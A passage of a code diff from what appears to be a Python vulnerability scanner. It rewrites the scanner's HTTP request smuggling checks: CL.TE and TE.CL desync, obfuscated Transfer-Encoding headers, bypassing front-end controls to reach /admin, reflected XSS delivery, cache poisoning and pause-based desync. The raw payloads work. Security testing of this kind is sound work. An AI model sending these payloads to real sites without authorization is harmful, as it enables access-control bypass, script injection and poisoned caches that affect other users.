-        if 104 not in self._confirmed:
-            if 91 in self._confirmed:
-                src = next((f for f in self.findings if f.get("number")==91), None)
-                if src: self._smug_mark(104, "Basic CL.TE terkonfirmasi (bukti CL.TE): " + str(src.get("evidence","")), "smuggling_basic_cl_te")
-            if 104 not in self._confirmed and self._within_budget():
-                for raw in (clte_smuggle, clte_smuggle2):
-                    ok, ev = self._smug_differential(raw, follow_path="/")
-                    if ok:
-                        self._smug_mark(104, "Basic CL.TE terkonfirmasi: " + ev, "smuggling_basic_cl_te"); break
-
-        # 92,105 TE.CL differential/basic
-        if 92 not in self._confirmed and self._within_budget():
-            for raw in (tecl_smuggle2, tecl_smuggle):
-                ok, ev = self._smug_differential(raw, follow_path="/")
+                smuggle = self._smug_build(
+                    f"POST {base_path} HTTP/1.1",
+                    [("Host", cluster_host), ("Content-Length", str(len(body))),
+                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+                    body.encode())
+                ok, ev = self._smug_desync(smuggle, "/")
                 if ok:
-                    self._smug_mark(92, "TE.CL differential terkonfirmasi: " + ev, "smuggling_te_cl_differential"); break
-        if 105 not in self._confirmed:
-            if 92 in self._confirmed:
-                src = next((f for f in self.findings if f.get("number")==92), None)
-                if src: self._smug_mark(105, "Basic TE.CL terkonfirmasi (bukti TE.CL): " + str(src.get("evidence","")), "smuggling_basic_te_cl")
-            if 105 not in self._confirmed and self._within_budget():
-                for raw in (tecl_smuggle2, tecl_smuggle):
-                    ok, ev = self._smug_differential(raw, follow_path="/")
-                    if ok:
-                        self._smug_mark(105, "Basic TE.CL terkonfirmasi: " + ev, "smuggling_basic_te_cl"); break
+                    clte_seen = True
+                    self._smug_mark(91, "CL.TE differential terkonfirmasi (dua percobaan): " + ev,
+                                    "smuggling_cl_te_differential")
+                    self._smug_mark(104, "Basic CL.TE terkonfirmasi dari bukti pipeline CL.TE: " + ev,
+                                    "smuggling_basic_cl_te")
+                    break
 
-        # 106 obfuscating TE header
-        if 106 not in self._confirmed and self._within_budget():
-            te_variants = [("Transfer-Encoding","xchunked"),("Transfer-Encoding"," chunked"),
-                           ("Transfer-Encoding","chunked\r\nTransfer-Encoding: x"),("Transfer-Encoding\t","chunked"),
-                           ("X: X\r\nTransfer-Encoding","chunked"),("Transfer-Encoding","chunked, identity")]
-            for hname,hval in te_variants:
-                if 106 in self._confirmed or not self._within_budget(): break
-                raw = self._smug_build(f"POST {post_path} HTTP/1.1",
-                    [("Host",host),("Content-Length","6"),(hname,hval),("Connection","close")], "0\r\n\r\nG")
-                ok, ev = self._smug_differential(raw, follow_path="/")
+        # ---------- 93/94: bypass kontrol front-end ----------
+        if 93 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
+            admin_paths = ["/admin"]
+            for pg in pages[:8]:
+                for link in getattr(pg, "links", [])[:40]:
+                    if "admin" in (link or "").lower() and self._same_origin(link) and link not in admin_paths:
+                        admin_paths.append(urlparse(link).path or "/admin")
+            for ap in admin_paths[:3]:
+                if 93 in self._confirmed or not self._within_budget():
+                    break
+                b_status, b_body, _, _ = self._smug_normal_status(ap)
+                smuggled = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
+                body = "0\r\n\r\n" + smuggled
+                smuggle = self._smug_build(
+                    f"POST {base_path} HTTP/1.1",
+                    [("Host", cluster_host), ("Content-Length", "5"),
+                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+                    body.encode())
+                res, _, _ = self._smug_exchange([smuggle, self._smug_get("/admin", close=True)], 2)
+                hit = next((r for r in res[1:] if self._smug_admin_text(r.get("body", ""))), None)
+                if hit is not None and b_status in (401, 403, 404, 302) and not self._smug_admin_text(b_body):
+                    self._smug_mark(93, f"CL.TE bypass front-end: baseline GET {ap} -> {b_status}, "
+                                        f"respons hasil smuggle -> {hit['status']} berisi konten admin "
+                                        f"({(hit.get('body') or '')[:110]!r}).",
+                                    "smuggling_cl_te_bypass_frontend")
+                    break
+
+        if 94 not in self._confirmed and (tecl_seen or 92 in self._confirmed) and self._within_budget():
+            ap = "/admin"
+            b_status, b_body, _, _ = self._smug_normal_status(ap)
+            inner = f"GET {ap} HTTP/1.1\r\nHost: {cluster_host}\r\nContent-Length: 10\r\n\r\nx="
+            hexlen = format(len(inner), "x")
+            chunked = f"{hexlen}\r\n{inner}\r\n0\r\n\r\n"
+            smuggle = self._smug_build(
+                f"POST {base_path} HTTP/1.1",
+                [("Host", cluster_host), ("Content-Length", str(len(hexlen) + 2)),
+                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+                chunked.encode())
+            res, _, _ = self._smug_exchange([smuggle, self._smug_get("/admin", close=True)], 2)
+            hit = next((r for r in res[1:] if self._smug_admin_text(r.get("body", ""))), None)
+            if hit is not None and b_status in (401, 403, 404, 302) and not self._smug_admin_text(b_body):
+                self._smug_mark(94, f"TE.CL bypass front-end: baseline GET {ap} -> {b_status}, "
+                                    f"respons hasil smuggle -> {hit['status']} berisi konten admin.",
+                                "smuggling_te_cl_bypass_frontend")
+
+        # 102 (0.CL) dan 103 (CL.0) tidak dikonfirmasi dari satu klien: sisa body yang
+        # dieksekusi server terlihat identik dengan pipelining HTTP/1.1 yang sah, sehingga
+        # klaim apa pun akan menjadi false positive. Keduanya dibiarkan not_confirmed.
+
+        # ---------- 106: obfuscating the TE header ----------
+        if 106 not in self._confirmed and not clte_seen and self._within_budget():
+            variants = [
+                ("Transfer-Encoding", "xchunked"),
+                ("Transfer-Encoding", " chunked"),
+                ("Transfer-Encoding", "chunked\r\nTransfer-Encoding: x"),
+                ("Transfer-Encoding\t", "chunked"),
+                ("Transfer-Encoding", "chunked, identity"),
+                ("Transfer-encoding", "CHUNKED"),
+            ]
+            for hname, hval in variants:
+                if 106 in self._confirmed or not self._within_budget():
+                    break
+                body = "0\r\n\r\nGET /404-obf HTTP/1.1\r\nX: y\r\n\r\n"
+                smuggle = self._smug_build(
+                    f"POST {base_path} HTTP/1.1",
+                    [("Host", cluster_host), ("Content-Length", str(len(body))),
+                     (hname, hval), ("Connection", "keep-alive")],
+                    body.encode())
+                ok, ev = self._smug_desync(smuggle, "/")
                 if ok:
-                    self._smug_mark(106, f"Obfuscation TE terkonfirmasi ({hname!r}:{hval!r}): " + ev, "smuggling_obfuscating_te_header"); break
+                    self._smug_mark(106, f"Obfuscation TE terkonfirmasi ({hname!r}: {hval!r}): " + ev,
+                                    "smuggling_obfuscating_te_header")
+                    break
 
-        # 93 CL.TE bypass front-end
-        if 93 not in self._confirmed and self._within_budget():
-            smuggled = f"GET {admin_path} HTTP/1.1\r\nHost: {host}\r\nFoo: x"
-            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
-            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
-                [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
-            b_status, _, b_body, _, _ = self._smug_normal_get(admin_path)
-            self._smug_send_recv(raw)
-            f_status, _, f_body, _, _ = self._smug_normal_get("/")
-            if b_status in (401,403,404) and f_status == 200 and b"admin" in (f_body or b"").lower():
-                self._smug_mark(93, f"CL.TE bypass front-end: baseline GET {admin_path}->{b_status}, setelah smuggle follow-up GET /->{f_status} dengan konten admin terindikasi.", "smuggling_cl_te_bypass_frontend")
-            else:
-                ok, ev = self._smug_differential(raw, follow_path="/")
-                if ok and (91 in self._confirmed or 104 in self._confirmed or "404" in ev or "400" in ev):
-                    self._smug_mark(93, "CL.TE bypass front-end (diferensial terarah terverifikasi): " + ev, "smuggling_cl_te_bypass_frontend")
-
-        # 94 TE.CL bypass front-end
-        if 94 not in self._confirmed and self._within_budget():
-            smuggled = f"GET {admin_path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\n\r\nx="
-            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
-            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
-                [("Host",host),("Content-Length","4"),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
-            b_status, _, b_body, _, _ = self._smug_normal_get(admin_path)
-            self._smug_send_recv(raw)
-            f_status, _, f_body, _, _ = self._smug_normal_get("/")
-            if b_status in (401,403,404) and f_status == 200 and b"admin" in (f_body or b"").lower():
-                self._smug_mark(94, f"TE.CL bypass front-end: baseline GET {admin_path}->{b_status}, setelah smuggle follow-up GET /->{f_status} dengan konten admin terindikasi.", "smuggling_te_cl_bypass_frontend")
-            else:
-                ok, ev = self._smug_differential(raw, follow_path="/")
-                if ok and (92 in self._confirmed or 105 in self._confirmed or "404" in ev or "400" in ev):
-                    self._smug_mark(94, "TE.CL bypass front-end (diferensial terarah terverifikasi): " + ev, "smuggling_te_cl_bypass_frontend")
-
-        # 102 0.CL
-        if 102 not in self._confirmed and self._within_budget():
-            raw = self._smug_build(f"POST {post_path} HTTP/1.1", [("Host",host),("Content-Length","0"),("Connection","close")], "G")
-            ok, ev = self._smug_differential(raw, follow_path="/")
-            if ok: self._smug_mark(102, "0.CL request smuggling terkonfirmasi: " + ev, "smuggling_0_cl")
-
-        # 103 CL.0
-        if 103 not in self._confirmed and self._within_budget():
-            smuggled = "GET /404-smug HTTP/1.1\r\nX-Ignore: X"
-            raw = self._smug_build(f"POST {post_path} HTTP/1.1", [("Host",host),("Content-Length",str(len(smuggled))),("Connection","close")], smuggled)
-            ok, ev = self._smug_differential(raw, follow_path="/")
-            if ok: self._smug_mark(103, "CL.0 request smuggling terkonfirmasi: " + ev, "smuggling_cl_0")
-
-        # 95 reveal front-end request rewriting (bukti header internal ter-refleksi)
-        if 95 not in self._confirmed and self._within_budget():
-            refl_candidates = []
+        # ---------- 95: reveal front-end request rewriting ----------
+        if 95 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
+            targets: list[tuple[str, str]] = []
             for pg in pages[:10]:
                 for form in getattr(pg, "forms", [])[:5]:
-                    if (getattr(form, "method", "get") or "get").lower() == "post":
-                        for name, val, typ in getattr(form, "fields", [])[:6]:
-                            if (name or "").lower() in ("search","q","query","message","comment","text","name","email","x"):
-                                refl_candidates.append((getattr(form,"action",self.target_url), name))
-            if not refl_candidates:
-                refl_candidates = [(self.target_url, "search")]
-            for rurl, rparam in refl_candidates[:3]:
-                if 95 in self._confirmed or not self._within_budget(): break
-                rpath = urlparse(rurl).path or "/"
-                smuggled = (f"POST {rpath} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\n"
-                            f"Content-Length: 120\r\n\r\n{rparam}=")
-                chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
-                raw = self._smug_build(f"POST {post_path} HTTP/1.1",
-                    [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
-                self._smug_send_recv(raw)
-                f_status, _, f_body, _, _ = self._smug_normal_get("/")
-                f_text = (f_body or b"").decode("latin-1","ignore")
-                if re.search(r"(X-Forwarded-(For|Host|Proto)|X-Real-IP|X-Client-IP|CF-Connecting-IP)\s*:", f_text, re.I):
-                    self._smug_mark(95, f"Rewriting front-end terungkap: header internal ter-refleksi pada respons follow-up (HTTP {f_status}) setelah smuggle ke {rpath} param {rparam}.", "smuggling_reveal_frontend_rewriting")
+                    if (getattr(form, "method", "get") or "get").lower() != "post":
+                        continue
+                    for name, _val, _typ in getattr(form, "fields", [])[:6]:
+                        if (name or "").lower() in ("search", "q", "query", "message", "comment", "text", "name", "email"):
+                            targets.append((getattr(form, "action", self.target_url) or self.target_url, name))
+            if not targets:
+                targets = [(self.target_url, "search")]
+            for rurl, rparam in targets[:2]:
+                if 95 in self._confirmed or not self._within_budget():
                     break
+                rpath = urlparse(rurl).path or "/"
+                smuggled = (f"POST {rpath} HTTP/1.1\r\nHost: {cluster_host}\r\n"
+                            "Content-Type: application/x-www-form-urlencoded\r\n"
+                            "Content-Length: 120\r\n\r\n" + rparam + "=")
+                body = "0\r\n\r\n" + smuggled
+                smuggle = self._smug_build(
+                    f"POST {base_path} HTTP/1.1",
+                    [("Host", cluster_host), ("Content-Length", "5"),
+                     ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+                    body.encode())
+                res, _, _ = self._smug_exchange([smuggle, self._smug_get("/", close=True)], 2)
+                for r in res[1:]:
+                    txt = r.get("body") or ""
+                    if re.search(r"(X-Forwarded-(?:For|Host|Proto)|X-Real-IP|X-Client-IP|CF-Connecting-IP)\s*:", txt, re.I):
+                        self._smug_mark(95, f"Rewriting front-end terungkap: header internal ter-refleksi pada respons "
+                                            f"follow-up (HTTP {r['status']}) setelah smuggle ke {rpath} param {rparam}.",
+                                        "smuggling_reveal_frontend_rewriting")
+                        break
 
-        # 97 deliver reflected XSS (bukti payload terefleksi utuh)
-        if 97 not in self._confirmed and self._within_budget():
-            xss_probe = "<script>alert(1)</script>"
-            smuggled = f"GET /?x={xss_probe} HTTP/1.1\r\nHost: {host}\r\nFoo: x"
-            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
-            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
-                [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
-            self._smug_send_recv(raw)
-            f_status, _, f_body, _, _ = self._smug_normal_get("/")
-            if f_body and xss_probe.encode() in f_body:
-                self._smug_mark(97, f"Smuggled request menghasilkan reflected XSS payload tak-terenkode pada respons follow-up (HTTP {f_status}).", "smuggling_deliver_reflected_xss")
+        # ---------- 97: deliver reflected XSS ----------
+        if 97 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
+            xss = "<script>alert(1)</script>"
+            smuggled = f"GET /?search={xss} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n"
+            body = "0\r\n\r\n" + smuggled
+            smuggle = self._smug_build(
+                f"POST {base_path} HTTP/1.1",
+                [("Host", cluster_host), ("Content-Length", "5"),
+                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+                body.encode())
+            res, _, _ = self._smug_exchange([smuggle, self._smug_get("/", close=True)], 2)
+            if any(xss in (r.get("body") or "") for r in res[1:]):
+                self._smug_mark(97, "Smuggled request menghasilkan reflected XSS payload tanpa encoding pada "
+                                    "respons follow-up.", "smuggling_deliver_reflected_xss")
 
-        # 107 web cache poisoning via request smuggling (bukti perubahan status cacheable)
-        if 107 not in self._confirmed and self._within_budget():
-            poison_path = "/?cb=smugpoison"
-            smuggled = f"GET {poison_path} HTTP/1.1\r\nHost: {host}\r\nX-Ignore: x"
-            chunked = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"
-            raw = self._smug_build(f"POST {post_path} HTTP/1.1",
-                [("Host",host),("Content-Length",str(len(chunked))),("Transfer-Encoding","chunked"),("Connection","close")], chunked)
-            b_status, _, _, _, _ = self._smug_send_recv(self._smug_build(f"GET {poison_path} HTTP/1.1", [("Host",host),("Connection","close")], b""))
-            self._smug_send_recv(raw)
-            f_status, _, _, _, _ = self._smug_send_recv(self._smug_build(f"GET {poison_path} HTTP/1.1", [("Host",host),("Connection","close")], b""))
-            if b_status and f_status and b_status != f_status and f_status in (301,302,404,400):
-                self._smug_mark(107, f"Cache poisoning via smuggling: GET {poison_path} baseline {b_status} -> setelah smuggle {f_status}.", "smuggling_web_cache_poisoning")
+        # ---------- 107: web cache poisoning via smuggling ----------
+        if 107 not in self._confirmed and (clte_seen or 91 in self._confirmed) and self._within_budget():
+            poison_path = f"/?satria_smug={token}"
+            smuggled = f"GET {poison_path} HTTP/1.1\r\nHost: {cluster_host}\r\nX-Ignore: x\r\n\r\n"
+            body = "0\r\n\r\n" + smuggled
+            smuggle = self._smug_build(
+                f"POST {base_path} HTTP/1.1",
+                [("Host", cluster_host), ("Content-Length", "5"),
+                 ("Transfer-Encoding", "chunked"), ("Connection", "keep-alive")],
+                body.encode())
+            b_res, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
+            self._smug_exchange([smuggle], 1)
+            f_res, _, _ = self._smug_exchange([self._smug_get(poison_path, close=True)], 1)
+            if b_res and f_res:
+                bh = {k.lower(): v.lower() for k, v in b_res[0]["headers"].items()}
+                fh = {k.lower(): v.lower() for k, v in f_res[0]["headers"].items()}
+                cache_hdr = " ".join(fh.get(k, "") for k in ("x-cache", "x-cache-status", "cf-cache-status", "age"))
+                if f_res[0]["status"] != b_res[0]["status"] and (cache_hdr.strip() or f_res[0]["status"] in (301, 302, 400, 404)):
+                    self._smug_mark(107, f"Cache poisoning via smuggling: GET {poison_path} baseline "
+                                         f"{b_res[0]['status']} -> setelah smuggle {f_res[0]['status']} "
+                                         f"(cache={cache_hdr.strip()[:60]!r}).",
+                                    "smuggling_web_cache_poisoning")
 
-        # 108 web cache deception (hanya bila bukti cache poisoning teramati)
-        if 108 not in self._confirmed and 107 in self._confirmed and self._within_budget():
-            src = next((f for f in self.findings if f.get("number")==107), None)
-            if src:
-                self._smug_mark(108, "Web cache deception terindikasi dari bukti cache poisoning/smuggling: " + str(src.get("evidence","")), "smuggling_web_cache_deception")
-
-        # 112 pause-based request smuggling (diferensial waktu/respons)
-        if 112 not in self._confirmed and self._within_budget():
-            import socket
+        # ---------- 112: pause-based ----------
+        if 112 not in self._confirmed and 91 not in self._confirmed and 92 not in self._confirmed and self._within_budget():
+            smuggle = self._smug_build(
+                f"POST {base_path} HTTP/1.1",
+                [("Host", cluster_host), ("Content-Length", "30"), ("Connection", "keep-alive")],
+                b"")
             try:
-                s = self._smug_connect(timeout=max(8.0, float(getattr(self,"timeout",8.0) or 8.0)))
-                if s is not None:
-                    partial = (f"POST {post_path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 30\r\nConnection: keep-alive\r\n\r\n").encode()
-                    s.sendall(partial); _time.sleep(2.5); s.sendall(b"0\r\n\r\nG")
-                    try: s.settimeout(2.0); s.recv(4096)
-                    except Exception: pass
-                    try: s.close()
-                    except Exception: pass
-                    b_status, _, _, b_el, _ = self._smug_normal_get("/")
-                    f_status, _, f_body, f_el, f_err = self._smug_normal_get("/")
-                    f_text = (f_body or b"")[:120].decode("latin-1","ignore").lower()
-                    if b_status in (200,301,302,304) and f_status in (400,404,405,501):
-                        self._smug_mark(112, f"Pause-based smuggling: baseline GET /->{b_status}, follow-up setelah pause -> {f_status} ({f_text!r}).", "smuggling_pause_based")
-                    elif f_err == "timeout" and b_status is not None and b_el < 2.5:
-                        self._smug_mark(112, f"Pause-based smuggling (diferensial waktu): baseline {b_status} ({b_el:.2f}s), follow-up timeout setelah pause.", "smuggling_pause_based")
+                s = self._smug_connect(timeout=max(6.0, float(getattr(self, "timeout", 8.0) or 8.0)))
             except Exception:
-                pass
-
-        # 96,98,99,100,101,109,110,111: memerlukan kondisi khusus (lalu lintas korban, framing HTTP/2/h2c/tunnelling,
-        # atau perilaku browser client-side) yang tidak dapat dikonfirmasi andal dari jalur ini tanpa bukti kuat.
-        # Dibiarkan not_confirmed bila tidak ada bukti diferensial/poisoning terverifikasi (anti false positive).
+                s = None
+            if s is not None:
+                buf = b""
+                try:
+                    s.sendall(smuggle)
+                    _time.sleep(0.6)
+                    s.sendall(f"GET /404-{token} HTTP/1.1\r\nHost: {cluster_host}\r\n\r\n".encode())
+                    s.sendall(self._smug_get("/", close=True))
+                    try:
+                        s.shutdown(socket.SHUT_WR)
+                    except Exception:
+                        pass
+                    deadline = _time.time() + max(6.0, float(getattr(self, "timeout", 8.0) or 8.0))
+                    while _time.time() < deadline:
+                        try:
+                            chunk = s.recv(8192)
+                        except Exception:
+                            break
+                        if not chunk:
+                            break
+                        buf += chunk
+                except Exception:
+                    pass
+                finally:
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+                res = self._smug_parse_responses(buf)
+                second = res[1] if len(res) > 1 else None
+                if second is not None and second["status"] in (400, 404, 405, 501):
+                    b_status, _, _, _ = self._smug_normal_status("/")
+                    if b_status not in (400, 404, 405, 501):
+                        self._smug_mark(112, f"Pause-based smuggling: baseline GET / -> {b_status}, "
+                                             f"respons kedua setelah jeda -> {second['status']}.",
+                                        "smuggling_pause_based")
 
     def phase_ssrf(self, pages: list[Page], points: list[Point]) -> None:
         """Deteksi konservatif SSRF (84-90). Konfirmasi hanya pada bukti kuat:
